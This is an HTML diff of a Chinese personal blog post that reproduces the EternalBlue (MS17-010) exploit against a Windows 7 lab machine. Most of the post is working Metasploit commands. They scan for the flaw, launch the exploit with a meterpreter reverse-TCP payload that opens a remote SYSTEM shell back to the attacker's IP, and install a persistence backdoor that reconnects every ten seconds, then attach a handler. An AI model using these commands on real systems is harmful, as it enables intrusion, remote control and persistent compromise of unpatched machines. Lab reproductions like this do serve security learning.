@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mingliangliu.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445&#x2F;TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。 基本环境 Kali Linux (IP: 192.168.190.135) Metasploit工具 靶机，MSDN下载的win7  (IP:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝漏洞复现">
+<meta property="og:url" content="https://mingliangliu.com/2019/08/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="清欢&#39;s Blog">
+<meta property="og:description" content="前言永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445&#x2F;TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。 基本环境 Kali Linux (IP: 192.168.190.135) Metasploit工具 靶机，MSDN下载的win7  (IP:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mingliangliu.com/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B01.PNG">
+<meta property="og:image" content="https://mingliangliu.com/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02.PNG">
+<meta property="article:published_time" content="2019-08-04T09:07:47.000Z">
+<meta property="article:modified_time" content="2021-04-29T05:47:10.407Z">
+<meta property="article:author" content="清欢">
+<meta property="article:tag" content="信息安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mingliangliu.com/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B01.PNG">
+
+<link rel="canonical" href="https://mingliangliu.com/2019/08/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>永恒之蓝漏洞复现 | 清欢's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">清欢's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个被遗忘的笔记本</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mingliangliu.com/2019/08/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="清欢">
+      <meta itemprop="description" content="一个被遗忘的笔记本">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="清欢's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          永恒之蓝漏洞复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-04 17:07:47" itemprop="dateCreated datePublished" datetime="2019-08-04T17:07:47+08:00">2019-08-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-29 13:47:10" itemprop="dateModified" datetime="2021-04-29T13:47:10+08:00">2021-04-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。</p>
+<h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><ul>
+<li>Kali Linux (IP: 192.168.190.135)</li>
+<li>Metasploit工具</li>
+<li>靶机，MSDN下载的win7  (IP: 192.168.190.136)</li>
+</ul>
+<p>win7中开启文件共享</p>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>先启动msfconsole，输入如下指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.190.136:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.190.136:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>从上述结果可知：该win7存在漏洞</p>
+<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>执行如下指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>第一行指令意思是加载Metasploit中的EternalBlue攻击模块，第四行是设置shell的通信类型，payload中装载的是漏洞利用成功后在目标机器上执行的代码</p>
+<p>结果如下：</p>
+<img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B01.PNG" class="">
+
+<p>执行一下<code>shell</code>指令：</p>
+<img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02.PNG" class="">
+
+<p>可以看到，我们已获得目标机器的最高权限的shell</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>metasploit自带的留后门方式有两种：metsvc和persistence，但都有弊端，官方都不推荐使用，这里使用persistence试下</p>
+<p>执行如下指令即可在目标机器中留一个后门：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -U -i 10 -p 4444 -r 192.168.190.135</span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<ul>
+<li>-U：设置后门在用户登录后自启动。</li>
+<li>-i：设置反向连接间隔时间，单位为秒。</li>
+<li>-p：设置反向连接的端口号。</li>
+<li>-r：设置反向连接的ip地址。</li>
+</ul>
+<p>之后可以使用handler模块进行连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.190.135</span><br><span class="line">LHOST &#x3D;&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>完</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="prev" title="Ubuntu双系统搭建GPU机器学习环境">
+      <i class="fa fa-chevron-left"></i> Ubuntu双系统搭建GPU机器学习环境
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/08/04/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%AF%BB%E5%9D%80/" rel="next" title="保护模式下的寻址">
+      保护模式下的寻址 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">基本环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.</span> <span class="nav-text">漏洞探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">开始攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">权限维持</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="清欢"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">清欢</p>
+  <div class="site-description" itemprop="description">一个被遗忘的笔记本</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">清欢</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
